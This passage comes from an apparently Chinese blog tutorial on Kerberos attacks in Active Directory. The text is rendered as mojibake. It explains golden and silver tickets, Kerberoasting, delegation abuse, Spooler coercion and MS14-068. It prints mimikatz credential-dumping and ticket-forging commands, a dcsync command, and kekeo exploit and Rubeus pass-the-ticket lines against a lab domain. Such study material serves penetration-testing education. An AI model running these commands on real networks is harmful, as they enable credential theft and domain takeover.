è§£å¯†ï¼ŒKDCç”±æ­¤åˆ¤æ–­Clientæ˜¯å¦æœ‰è®¿é—®æœåŠ¡çš„æƒé™ã€‚å½“ç„¶ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®PACï¼Œå°±ä¸ä¼šå»KDCæ±‚è¯ï¼Œè¿™ä¹Ÿæ˜¯ç™½é“¶ç¥¨æ®æˆåŠŸçš„åŸå› ã€‚</li></ol><h2 id="kerberosæ”»å‡»åˆ†ç±»"><a href="#Kerberosæ”»å‡»åˆ†ç±»" class="headerlink" title="Kerberosæ”»å‡»åˆ†ç±»"></a>Kerberosæ”»å‡»åˆ†ç±»</h2><p>Kerberosæ”»å‡»å…¶å®å¯ä»¥å½’ç»“ä¸ºä¸¤ä¸ªå­—:ç¥¨æ®,å³å¸¸è¯´çš„ç¥¨æ®ä¼ é€’æ”»å‡»(Pass The Ticket,PTT)ã€‚</p><p>è¿™é‡Œæœ‰ä¸€å¼ æ”»å‡»åˆ†ç±»å›¾</p><p><img src="http://cdn.clown2024.cn/202407151440638.png" alt="image-20240421120946839"></p><h1 id="as_reqampas_repé˜¶æ®µæ”»å‡»"><a href="#AS-REQ-AS-REPé˜¶æ®µæ”»å‡»" class="headerlink" title="AS_REQ&amp;AS_REPé˜¶æ®µæ”»å‡»"></a>AS_REQ&amp;AS_REPé˜¶æ®µæ”»å‡»</h1><p><strong>åŸŸå†…ç”¨æˆ·æšä¸¾</strong></p><p>å½“æœºå™¨ä¸åœ¨åŸŸä¸­æ—¶ï¼Œå¯ä»¥é€šè¿‡Kerberosçš„ASREQå·¥ä½œåŸç†æ¥è¿›è¡Œæšä¸¾åŸŸå†…è´¦å·ï¼Œç”±äºç”¨æˆ·åå­˜åœ¨è·Ÿä¸å­˜åœ¨çš„æŠ¥é”™ä¸ä¸€è‡´ï¼Œå¯¼è‡´å¯ä»¥è¿›è¡Œç”¨æˆ·åç›¸å…³æšä¸¾ã€‚</p><p><strong>å¯†ç å–·æ´’æ”»å‡»</strong></p><p>å¯†ç å–·æ´’æ”»å‡»æ˜¯æŒ‡å¯¹å…¶ä»–ç”¨æˆ·è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œç±»ä¼¼æš´åŠ›ç ´è§£ã€‚</p><p><strong>AS_REP Roastingæ”»å‡»</strong></p><p>å½“è¢«æ”»å‡»è´¦å·è®¾ç½®â€œä¸éœ€è¦Kerberosé¢„èº«ä»½éªŒè¯â€åï¼Œåœ¨ASREPè¿‡ç¨‹ä¸­å°±å¯ä»¥ä»»æ„ä¼ªé€ ç”¨æˆ·åè¯·æ±‚ç¥¨æ®ï¼Œéšå AS ä¼šå°†ä¼ªé€ è¯·æ±‚çš„ç”¨æˆ·å NTLMHash åŠ å¯†åè¿”å›ï¼Œç„¶åä¾¿å¯ä»¥è¿›è¡Œçˆ†ç ´ã€‚</p><p><strong>é»„é‡‘ç¥¨æ®æ”»å‡»</strong></p><p>åœ¨Kerberos è®¤è¯ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·çš„ç¥¨æ®éƒ½æ˜¯ç”± krbtgtçš„ NTLM å“ˆå¸Œå€¼åŠ å¯†ç”Ÿæˆçš„ï¼Œè·å¾— krbtgt çš„å“ˆå¸Œå€¼,ä¾¿å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·çš„ç¥¨æ®ï¼Œè¿™ç§æ”»å‡»æ–¹å¼è¢«ç§°ä¸ºé»„é‡‘ç¥¨æ®(GoldenTicket)ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151511676.png" alt="image-20240421123213561"></p><p>æ”»å‡»éœ€è¦è¿™äº›ä¿¡æ¯ï¼šåŸŸåï¼ŒåŸŸsidï¼Œkrbtgtå“ˆå¸Œå€¼ï¼Œä¼ªé€ çš„ç”¨æˆ·ã€‚</p><blockquote><p>åŸŸsidï¼š</p><p>æŸ¥è¯¢è‡ªå·±çš„SIDå¯ä»¥é€šè¿‡ï¼š<code>whoami /user</code></p><p>æŸ¥è¯¢å…¶ä»–ç”¨æˆ·çš„SIDå¯ä»¥é€šè¿‡WMIæŸ¥è¯¢ï¼š<code>wmic useraccount where name=%username% get sid</code></p><p>SIDçš„å½¢å¼ï¼šS-1-5-21-&lt;åŸŸæ ‡è¯†&gt;-&lt;ç›¸å¯¹æ ‡è¯†&gt;</p><ul><li>â€œS-1â€è¡¨ç¤ºè¯¥æ ‡è¯†æ˜¯ä¸€ä¸ªSIDã€‚</li><li>â€œ5â€è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªWindowsæœåŠ¡å™¨æˆ–åŸŸçš„æ ‡è¯†ã€‚</li><li>â€œ21â€æ˜¯ä¸€ä¸ªå›ºå®šå€¼ï¼Œç”¨äºæŒ‡ç¤ºè¯¥SIDæ˜¯ä¸€ä¸ªåŸŸSIDã€‚</li><li>â€œ&lt;åŸŸæ ‡è¯†&gt;â€æ˜¯ä¸€ä¸ªå”¯ä¸€çš„åŸŸæ ‡è¯†ç¬¦ï¼Œç”¨äºæ ‡è¯†ç‰¹å®šçš„åŸŸã€‚</li><li>â€œ&lt;ç›¸å¯¹æ ‡è¯†&gt;â€æ˜¯ä¸€ä¸ªç›¸å¯¹äºåŸŸçš„å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†åŸŸä¸­çš„å®‰å…¨ä¸»ä½“ã€‚</li></ul><p>å¸¸è§çš„SIDåˆ—è¡¨ï¼š</p><ul><li>S-1-5-18 (LocalSystem)</li><li>S-1-5-19 (LocalService)</li><li>S-1-5-20 (NetworkService)</li><li>S-1-5-32-544 (Administrators)</li><li>S-1-5-32-545 (Users)</li><li>S-1-5-32-550 (PrintOperators)</li></ul></blockquote><ol><li><p>åœ¨DCç”¨mimikatzæ‰§è¡Œä¸‹é¢å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;Log&quot; &quot;Privilege::Debug&quot; &quot;lsadump::lsa /patch&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440640.png" alt="image-20240421122849443"></p></li><li><p>å¾—åˆ°krbtgtçš„å“ˆå¸Œå€¼åï¼Œå…ˆåœ¨win2008ä¸Šè®¿é—®DCçš„CIFSæœåŠ¡ï¼Œå‘ç°ä¸å¯è®¿é—®ï¼Œå†åˆ©ç”¨mimikatzç”Ÿæˆçš„é»„é‡‘ç¥¨æ®å¯¼å…¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:S-1-5-21-752537975-3696201862-1060544381 /krbtgt:1fd539dboac55db506018c72586bb3a6 /ticket:ticket.kirbi<br>Kerberos::ptt ticket.kirbi<br></code></pre></td></tr></table></figure></li><li><p>å†æ¬¡è®¿é—®å°±ä¼šæˆåŠŸ</p><p><img src="http://cdn.clown2024.cn/202407151440641.png" alt="image-20240421123805145"></p></li></ol><blockquote><p>æ³¨æ„ï¼Œè·¨åŸŸä¸‹çš„é»„é‡‘ç¥¨æ®æœ‰ä¸€å®šé™åˆ¶ï¼Œä½†åˆ©ç”¨SidHistory ä¾¿å¯è§£å†³</p></blockquote><h1 id="tgs_reqamptgs_repé˜¶æ®µæ”»å‡»"><a href="#TGS-REQ-TGS-REPé˜¶æ®µæ”»å‡»" class="headerlink" title="TGS_REQ&amp;TGS_REPé˜¶æ®µæ”»å‡»"></a>TGS_REQ&amp;TGS_REPé˜¶æ®µæ”»å‡»</h1><h2 id="kerberosastæ”»å‡»"><a href="#Kerberosastæ”»å‡»" class="headerlink" title="Kerberosastæ”»å‡»"></a>Kerberosastæ”»å‡»</h2><p>è¿™é‡Œè¦å…ˆäº†è§£ä¸€ä¸‹SPNã€‚SPN(Service Principal Nameï¼ŒæœåŠ¡å™¨ä¸»ä½“åç§°)æ˜¯æœåŠ¡å™¨æ‰€è¿è¡ŒæœåŠ¡çš„å”¯ä¸€æ ‡è¯†ï¼Œæ¯ä¸ªä½¿ç”¨Kerberos è®¤è¯çš„æœåŠ¡éƒ½å¿…é¡»æ­£ç¡®é…ç½®ç›¸åº”çš„ SPNï¼Œä¸€ä¸ªè´¦æˆ·ä¸‹å¯ä»¥æœ‰å¤šä¸ª SPNã€‚æ ¹æ®æƒé™ï¼ŒSPNæœ‰ä¸¤ç§æ³¨å†Œæ–¹å¼ï¼Œåˆ†åˆ«ä¸º:æœºå™¨è´¦æˆ· computersã€åŸŸç”¨æˆ·è´¦æˆ· usersã€‚KDC æŸ¥è¯¢ SPNä¹ŸæŒ‰ç…§è´¦æˆ·æ–¹å¼è¿›è¡ŒæŸ¥æ‰¾ã€‚</p><p>Kerberosast æ”»å‡»ä¸»è¦åˆ©ç”¨äº† TGS_REP é˜¶æ®µä½¿ç”¨æœåŠ¡çš„ NTLM Hashè¿”å›çš„åŠ å¯†æ•°æ®ï¼Œå¯¹äºåŸŸå†…çš„ä»»ä½•ä¸»æœºï¼Œéƒ½å¯ä»¥é€šè¿‡æŸ¥è¯¢ SPNï¼Œå‘åŸŸå†…çš„æ‰€æœ‰æœåŠ¡è¯·æ±‚ ST(å› ä¸º KDCä¸ä¼šéªŒè¯æƒé™)ï¼Œç„¶åè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œä½†åªæœ‰åŸŸç”¨æˆ·çš„ SPN æ˜¯å¯ä»¥åˆ©ç”¨çš„(è¿™æ˜¯å› ä¸ºæœºå™¨è´¦æˆ·çš„ SPNæ¯ 30 å¤©ä¼šæ›´æ”¹éšæœº 128 ä¸ªå­—ç¬¦å¯†ç å¯¼è‡´æ— æ³•è¢«ç ´è§£)ï¼Œæ‰€ä»¥åœ¨å®é™…è¿‡ç¨‹ä¸­è¦æ³¨æ„æ”»å‡»çš„æ˜¯åŸŸç”¨æˆ·ã€‚å½“ç„¶ï¼Œå¦‚æœè¯¥SPNæ²¡æœ‰æ³¨å†Œåœ¨åŸŸç”¨æˆ·ä¸‹ï¼Œå°±å¯ä»¥å°è¯•è¿›è¡Œæ³¨å†Œå†åˆ©ç”¨ hashcat ç ´è§£å³å¯</p><h2 id="ç™½é“¶ç¥¨æ®æ”»å‡»"><a href="#ç™½é“¶ç¥¨æ®æ”»å‡»" class="headerlink" title="ç™½é“¶ç¥¨æ®æ”»å‡»"></a>ç™½é“¶ç¥¨æ®æ”»å‡»</h2><p>å¦‚æœåœ¨æœªé…ç½® PAC çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡çš„å“ˆå¸Œè¢«æ³„éœ²ï¼Œå°±å¯ä»¥ä¼ªé€ ä»»ä½•äººçš„èº«ä»½è¿›å…¥è€Œæ²¡æœ‰æ£€æŸ¥ï¼Œè¿™ç§æ”»å‡»ç§°ä¸ºç™½é“¶ç¥¨æ®(Silver Ticket)ã€‚å…¶åŸç†æ˜¯é€šè¿‡ä¼ªé€  ST æ¥è®¿é—®æœåŠ¡,ä½†æ˜¯åªèƒ½è®¿é—®ç‰¹å®šæœåŠ¡å™¨ä¸Šçš„éƒ¨åˆ†æœåŠ¡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151511677.png" alt="image-20240421142236322"></p><p>å‡è®¾å·²è·å¾— DC æœºå™¨è´¦æˆ·çš„å“ˆå¸Œå€¼,ä¾¿å¯ä»¥ä½¿ç”¨é“¶ç¥¨è®¿é—®å…¶LDAP æœåŠ¡æ‰§è¡ŒDCSyncä¹Ÿå¯ä»¥ä¼ªé€ å…¶ä»–æœåŠ¡é€ æˆå…¶ä»–å±å®³ï¼Œå¦‚å¯¹ CIFS æœåŠ¡åˆ™å¯ä»¥å®ç°å®Œå…¨çš„è¿œç¨‹æ–‡ä»¶è®¿é—®ç­‰ç­‰ã€‚æ”»å‡»éœ€è¦ä»¥ä¸‹ä¿¡æ¯:åŸŸåï¼ŒåŸŸsidï¼ŒDC æœºå™¨è´¦æˆ·çš„ hashï¼Œä¼ªé€ çš„ä»»æ„ç”¨æˆ·åã€‚æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>åœ¨DCä¸Šä»¥ç®¡ç†å‘˜æƒé™ç”¨mimikatzæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimkatz.exe &quot;log&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è·å¾—DCæœºå™¨åçš„å“ˆå¸Œå€¼ã€‚</p></li><li><p>åˆ†åˆ«æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè·å¾—krbtgtç”¨æˆ·çš„hashä»è€Œåˆ¶ä½œé»„é‡‘ç¥¨æ®</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-1431000434-12531824-1301847844 /target:dc.hack-my.com /service:ldap /rc4:c890a8745007ebe3c21afc1cb8cd0a91 /user:venenof /ptt<br>lsadump:dcsync /domain:hack-my.com /user:krbtgt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440643.png" alt="image-20240421143421648"></p></li></ol><h2 id="å§”æ´¾æ”»å‡»"><a href="#å§”æ´¾æ”»å‡»" class="headerlink" title="å§”æ´¾æ”»å‡»"></a>å§”æ´¾æ”»å‡»</h2><p>åœ¨ç°å®æƒ…å†µä¸‹ï¼Œå¾€å¾€å¤šä¸ªæœåŠ¡ä¸å¯èƒ½åœ¨ä¸€å°æœºå™¨ä¸­ï¼Œé‚£ä¹ˆå¦‚æœç”¨æˆ·åœ¨ä½¿ç”¨æœåŠ¡Aæ—¶ï¼Œè¿™æ—¶å€™éœ€è¦æœåŠ¡Bä¸Šå±äºè‡ªå·±çš„æ•°æ®,æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯Aä»£ç”¨æˆ·å»è¯·æ±‚Bè¿”å›ç›¸åº”çš„ä¿¡æ¯ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯å§”æ´¾ã€‚</p><p>å§”æ´¾æ”»å‡»åˆ†ä¸ºéçº¦æŸå§”æ´¾ã€çº¦æŸå§”æ´¾ã€åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ä¸‰ç§ã€‚</p><h3 id="éçº¦æŸå§”æ´¾æ”»å‡»"><a href="#éçº¦æŸå§”æ´¾æ”»å‡»" class="headerlink" title="éçº¦æŸå§”æ´¾æ”»å‡»"></a>éçº¦æŸå§”æ´¾æ”»å‡»</h3><p>éçº¦æŸå§”æ´¾çš„è¯·æ±‚è¿‡ç¨‹å¦‚ä¸‹ï¼Œå…·ä½“çš„å¯ä»¥å»æŸ¥çœ‹å¾®è½¯çš„æ‰‹å†Œ</p><p><img src="http://cdn.clown2024.cn/202407151511678.png" alt="image-20240516175227543"></p><p>å¤§æ¦‚å°±æ˜¯å½“ service1 çš„æœåŠ¡è´¦æˆ·å¼€å¯äº†éçº¦æŸå§”æ´¾åï¼Œuser è®¿é—® service1 æ—¶ï¼Œservice1 ä¼šå°†user çš„ TGT ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç„¶å servicel å°±å¯ä»¥åˆ©ç”¨ TGTä»¥ user çš„èº«ä»½å»è®¿é—®åŸŸä¸­çš„ä»»ä½•user å¯ä»¥è®¿é—®çš„æœåŠ¡</p><p>å¦‚æœåŸŸç®¡ç†å‘˜è®¿é—®äº†å¼€å¯éçº¦æŸå§”æ´¾çš„æœåŠ¡ï¼Œè¯¥æœåŠ¡æ‰€åœ¨çš„è®¡ç®—æœºå°±ä¼šä¿å­˜åŸŸç®¡ç†å‘˜çš„TGTåœ¨å†…å­˜ä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥è·å–å…¶ç‰¹æƒå°±å¯ä»¥è·å–åŸŸæ§æƒé™ã€‚</p><p>æ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>æˆ‘ä»¬å¯ä»¥å…ˆå°†åŸŸå†…çš„ä¸€å°ä¸»æœºæ¯”å¦‚win2008è®¾ç½®éçº¦æŸå§”æ´¾</p><p><img src="http://cdn.clown2024.cn/202407151440645.png" alt="image-20240516180439225"></p><ol><li><p>å½“æœåŠ¡è´¦å·æˆ–ä¸»æœºè¢«è®¾ç½®ä¸ºéçº¦æŸå§”æ´¾æ—¶ï¼Œå…¶userAccountControlå±æ€§åŒ…å«TRUSTED_FOR_DELEGATIONè¿™ä¸ªflagå€¼ï¼Œå¯¹åº”æ˜¯0x80000ã€‚</p><p>å…¶ä¸­524288å¯¹åº”0x80000ï¼Œè€Œ805306369å¯¹åº”0x30000000ï¼Œå³ä»£è¡¨çš„æ˜¯æœºå™¨è´¦æˆ·</p><p>å¯ä»¥ç”¨adfindåœ¨åŸŸå†…æŸ¥æ‰¾éçº¦æŸå§”æ´¾ç”¨æˆ·ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">AdFind.exe -b <span class="hljs-string">&quot;DC=hack-my,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType =805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn distinguishedName<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440646.png" alt="image-20240516181059560"></p></li><li><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨mimikatzæŸ¥çœ‹win2008å†…å­˜ä¸­çš„ç¥¨æ®</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p>å½“åŸŸç®¡ç†å‘˜è®¿é—®è¯¥ä¸»æœºçš„æœåŠ¡ä¹‹åï¼Œå°±å¯ä»¥æŸ¥çœ‹åˆ°åŸŸç®¡ç†å‘˜çš„ç¥¨æ®ï¼Œæ¯”å¦‚è®¿é—®CIFSæœåŠ¡å</p><p><img src="http://cdn.clown2024.cn/202407151440647.png" alt="image-20240516181339603"></p></li></ol><p>ä¸è¿‡è¯¥æ”»å‡»æ–¹å¼è¿‡äºè¢«åŠ¨ï¼Œéœ€è¦ç­‰å¾…åŸŸç®¡ç†å‘˜å»è®¿é—®æ‰è¡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Spooleræ‰“å°æœºæœåŠ¡è®©åŸŸæ§ä¸»åŠ¨è¿æ¥ã€‚</p><p>åœ¨ Spooler æœåŠ¡é»˜è®¤å¼€å¯çš„æƒ…å†µä¸‹ï¼ŒåŸŸç”¨æˆ·å¯ä»¥åˆ©ç”¨ Windows æ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®(MS-RPRN)å¼ºåˆ¶ä»»ä½•è¿è¡Œäº† Spooler æœåŠ¡çš„åŸŸå†…è®¡ç®—æœºé€šè¿‡Kerberos æˆ– NTLM å¯¹ä»»ä½•ç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè¿™ä¾¿æ˜¯è¯¥æ”»å‡»æ–¹å¼çš„åŸç†ã€‚</p><p>æ”»å‡»è¿‡ç¨‹ï¼š</p><ol><li><p>DCçš„spoolerå¼€å¯ï¼Œåœ¨win2008ä¸Šåˆ©ç”¨Rubenuså¯¹åŸŸæ§æœºå™¨è´¦æˆ·çš„ç™»é™†ç›‘å¬(éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™)</p></li><li><p>åˆ©ç”¨SpoolSampleå·¥å…·å¼ºåˆ¶DCå¯¹win2008è¿›è¡Œè®¤è¯</p></li><li><p>åˆ©ç”¨Rubenuså¯¼å…¥TGT</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Rubenus.exe ptt /ticket:<span class="hljs-built_in">base64</span><br></code></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨mimikatzè¿›è¡ŒdcsyncæˆåŠŸè·å–å“ˆå¸Œå€¼ï¼Œåˆ¶ä½œé»„é‡‘ç¥¨æ®æ¥ç®¡åŸŸæ§</p></li></ol><blockquote><p>æ³¨æ„ï¼Œè¿™é‡Œè·å–çš„ TGT å®é™…ä¸Šæ˜¯DCçš„æœºå™¨è´¦æˆ·ï¼Œè€Œæœºå™¨è´¦æˆ·æ˜¯æ²¡æœ‰ç›¸åº”æƒé™è®¿é—® cifs æœåŠ¡çš„ï¼Œä½†æ˜¯åœ¨ LDAP æœåŠ¡ä¸­ï¼Œæœºå™¨è´¦æˆ·ä¼šè¢«å½“åšåŸŸæ§ä¸»æœºï¼Œä»è€Œå¯ä»¥dcsyncã€‚</p></blockquote><h3 id="çº¦æŸå§”æ´¾æ”»å‡»"><a href="#çº¦æŸå§”æ´¾æ”»å‡»" class="headerlink" title="çº¦æŸå§”æ´¾æ”»å‡»"></a>çº¦æŸå§”æ´¾æ”»å‡»</h3><p>ç”±äºéçº¦æŸå§”æ´¾çš„ä¸å®‰å…¨ï¼Œå¾®è½¯åœ¨winserver2003å¼•å…¥äº†çº¦æŸå§”æ´¾ï¼Œå¯¹Kerberosåè®®è¿›è¡Œäº†æ‹“å±•ï¼Œå¼•å…¥äº†S4Uåè®®ï¼šS4U2Selfå’ŒS4U2proxyã€‚</p><p>S4U2Selfç”¨äºç”Ÿæˆæœ¬èº«æœåŠ¡ TGS ç¥¨æ®ï¼ŒS4U2porxyç”¨äºâ€œä»£ç†â€ç›¸å…³ç”¨æˆ·ç”³è¯·å…¶ä»–æœåŠ¡ç¥¨æ®ã€‚è¯·æ±‚è¿‡ç¨‹å¦‚å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151511679.png" alt="image-20240516191222724"></p><blockquote><p> å…¶ä¸­å‰4æ­¥ä¸ºS4U2Selfï¼Œå6æ­¥ä¸ºS4U2proxyã€‚</p></blockquote><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼šS4U2selfæ˜¯service1ä»£è¡¨ç”¨æˆ·è¯·æ±‚çš„è‡ªèº«å¯è½¬å‘STï¼Œä½†æ˜¯ä¸èƒ½ä»¥è¯¥ç”¨æˆ·èº«ä»½è¯·æ±‚å¦å¤–çš„æœåŠ¡ï¼Œæ„å‘³ç€S4U2Selfå¿…é¡»åœ¨å…·æœ‰SPNçš„è´¦æˆ·ä¸Šæ“ä½œï¼›S4U2proxyåˆ™æ˜¯service1ä»¥S4U2selfé˜¶æ®µçš„å¯è½¬å‘ST(å…¶ä¸­åŒ…å«ç”¨æˆ·ç›¸å…³çš„èº«ä»½ä¿¡æ¯)ä»£è¡¨ç”¨æˆ·å»è¯·æ±‚service2çš„STã€‚</p><p>è€Œåœ¨ S4U2proxy è¿‡ç¨‹ä¼šé€šè¿‡åˆ¤æ–­ msds-allowedtodelegateto é‡Œçš„ SPNå€¼æ¥ç¡®å®šæ˜¯å¦å¯ä»¥ç”³è¯·åˆ° service2çš„ ST,æ‰€ä»¥è¿™ä¹Ÿæ˜¯çº¦æŸå§”æ´¾ä¸éçº¦æŸå§”æ´¾çš„æœ€å¤§åŒºåˆ«å³åªèƒ½è®¿é—®ç‰¹å®šçš„æœåŠ¡ã€‚æ³¨æ„,çº¦æŸå§”æ´¾çš„å‰ç½®æ¡ä»¶æœåŠ¡è‡ªèº«éœ€è¦é€šè¿‡ KDC è®¤è¯çš„ TGTã€‚</p><p>æ ¹æ®ä¸Šè¿°è¿‡ç¨‹ï¼Œå¦‚æœæˆ‘ä»¬è·å–äº†service1çš„æƒé™ï¼Œæ—¢å¯ä»¥ä¼ªé€ S4Uå…ˆè¯·æ±‚service1æœ¬èº«çš„STï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨æ­¤STä¾¿å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·è¯·æ±‚è·å–service2çš„STã€‚</p><h3 id="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</h3><p>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾(Resource Based Constrained Delegation,RBCD)æ˜¯åœ¨ WindowsServer 2012 ä¸­åŠ å…¥çš„åŠŸèƒ½,ä¸ä¼ ç»Ÿçº¦æŸå§”æ´¾ç›¸æ¯”,ä¸éœ€è¦åŸŸç®¡ç†å‘˜æƒé™å»è®¾ç½®ç›¸å…³å±æ€§ï¼Œè€Œæ˜¯å°†è®¾ç½®å§”æ´¾çš„æƒé™äº¤ç»™äº†æœåŠ¡æœºå™¨ã€‚</p><p>æœåŠ¡æœºå™¨åœ¨è‡ªå·±è´¦æˆ·ä¸Šé…ç½®msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§ï¼Œå°±å¯ä»¥è¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ã€‚å¯ä»¥å°†å…¶ç†è§£ä¸ºä¼ ç»Ÿçº¦æŸå§”æ´¾çš„åå‘è¿‡ç¨‹ã€‚ä»¥Aã€Bä¸¤ä¸ªæœåŠ¡ä¸ºä¾‹ï¼Œå‰è€…é€šè¿‡éœ€è¦åœ¨ DCä¸Šè®¾ç½®Açš„msDS-AllowedToDelegateToå±æ€§ï¼Œåè€…åˆ™è®¾ç½®Bçš„msDS-AllowedToActOnBehalfOf-OtherIdentity å±æ€§ï¼Œå³è®¾ç½®Açš„ SIDã€‚æ³¨æ„ï¼ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾çš„S4U2selfé˜¶æ®µçš„STæ˜¯ä¸å¯è½¬å‘çš„ã€‚</p><p>æ‰€ä»¥ï¼ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»çš„é‡ç‚¹æ˜¯ä¸Šè¿°å±æ€§çš„è®¾ç½®ï¼Œå¯ä»¥åˆ†ä¸ºä¸‹é¢ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>å¦‚æœèƒ½å¤Ÿä¿®æ”¹æœåŠ¡Bçš„è¯¥å±æ€§ï¼Œå°†å…¶æ›´æ–°ä¸ºå¯æ§åˆ¶çš„SPNè´¦æˆ·çš„SIDï¼Œæ—¢å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·è·å¾—æœåŠ¡Bçš„ç›¸å…³æƒé™ï¼Œä»è€Œå®ç°å˜ç›¸ææƒã€‚</li><li>åˆ©ç”¨realyæ”»å‡»ï¼Œé¦–è¦æ¡ä»¶æ˜¯relayæ”»å‡»ã€‚</li></ul><h1 id="pacæ”»å‡»"><a href="#PACæ”»å‡»" class="headerlink" title="PACæ”»å‡»"></a>PACæ”»å‡»</h1><h2 id="ms14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>MS14-068 æ¼æ´çš„åŸå› æ˜¯ KDC æ— æ³•æ­£ç¡®æ£€æŸ¥ PAC ä¸­çš„æœ‰æ•ˆç­¾åï¼Œç”±äºå…¶å®ç°ç­¾åçš„åŠ å¯†å…è®¸æ‰€æœ‰çš„ç­¾åç®—æ³•ï¼Œåªè¦å®¢æˆ·ç«¯æŒ‡å®šä»»æ„ç­¾åç®—æ³•ï¼ŒKDCæœåŠ¡å™¨å°±ä¼šä½¿ç”¨æŒ‡å®šçš„ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ä¸éœ€è¦ç›¸å…³å¯†é’¥çš„ç®—æ³•ï¼Œå¦‚MD5ï¼Œå®ç°å†…å®¹çš„ä»»æ„æ›´æ”¹ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥è‡ªå·±æ„é€ ä¸€å¼  PACï¼Œä¼ªé€ ç”¨æˆ·çš„ SID å’Œæ‰€åœ¨çš„ç»„ã€‚é‚£ä¹ˆï¼Œå¯ä»¥é€šè¿‡ä¼ªé€  PACï¼ŒåŠ å…¥åŸŸç®¡ç›¸å…³ä¿¡æ¯ï¼Œè®¿é—®åŸŸæ§æœåŠ¡ï¼ŒKDCä¼šè®¤ä¸ºå½“å‰ç”¨æˆ·æœ‰æƒé™ï¼Œä»è€ŒæŠŠè¿™ä¸ªç”¨æˆ·å½“ä½œåŸŸç®¡ç»„çš„æˆå‘˜ï¼Œè¿›è€Œè¾¾åˆ°æå‡ä¸ºåŸŸç®¡ç†å‘˜çš„æ•ˆæœã€‚</p><p>åˆ©ç”¨kekeoæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ä¾¿å¯ä»¥æˆåŠŸè®¿é—®CIFSæœåŠ¡ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">kekeo.exe <span class="hljs-string">&quot;exploit::ms14068 /domain:hack-my.com /user:username /password:password /ptt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440649.png" alt="image-20240516184624079"></p><h2 id="cve-2021-4227ampcve-2021-42287nopac"><a href="#CVE-2021-4227-CVE-2021-42287-NoPac" class="headerlink" 